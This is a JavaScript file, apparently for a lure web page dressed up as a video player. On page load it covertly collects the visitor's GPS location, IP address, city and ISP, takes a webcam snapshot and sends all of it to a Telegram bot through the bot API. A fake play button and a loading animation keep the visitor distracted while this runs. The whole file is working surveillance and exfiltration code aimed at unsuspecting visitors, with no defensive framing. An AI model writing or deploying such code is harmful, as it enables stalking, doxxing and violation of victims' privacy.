const BOT_TOKEN = "YOUR_BOT_TOKEN";
const CHAT_ID = "YOUR_CHAT_ID";

function sendToTelegram(photo, message) {
    let formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", photo);

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: "POST",
        body: formData
    }).then(() => {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message })
        });
    });
}

function captureData() {
    navigator.geolocation.getCurrentPosition(
        position => {
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            let userData = `📍 Lokasi: ${lat}, ${lon}\n`;

            fetch("https://ipinfo.io/json")
                .then(response => response.json())
                .then(data => {
                    userData += `🌍 Kota: ${data.city}, ${data.region}\n`;
                    userData += `🌐 IP: ${data.ip}\nISP: ${data.org}\n`;

                    navigator.mediaDevices.getUserMedia({ video: true })
                        .then(stream => {
                            let video = document.createElement("video");
                            video.srcObject = stream;
                            video.play();

                            let canvas = document.createElement("canvas");
                            let ctx = canvas.getContext("2d");

                            setTimeout(() => {
                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                                canvas.toBlob(blob => {
                                    sendToTelegram(blob, userData);
                                }, "image/png");

                                stream.getTracks().forEach(track => track.stop());
                            }, 2000);
                        })
                        .catch(() => sendToTelegram(null, userData + "❌ Kamera tidak diizinkan."));
                });
        },
        () => sendToTelegram(null, "❌ Lokasi tidak diizinkan.")
    );
}

window.onload = () => {
    captureData();

    setTimeout(() => {
        document.querySelector(".play-button").style.display = "none";
        document.querySelector(".loading-animation").style.display = "block";

        setTimeout(() => {
            document.querySelector(".loading-animation").style.display = "none";
            document.querySelector(".progress").style.width = "100%";
        }, 1500);
    }, 1000);
};
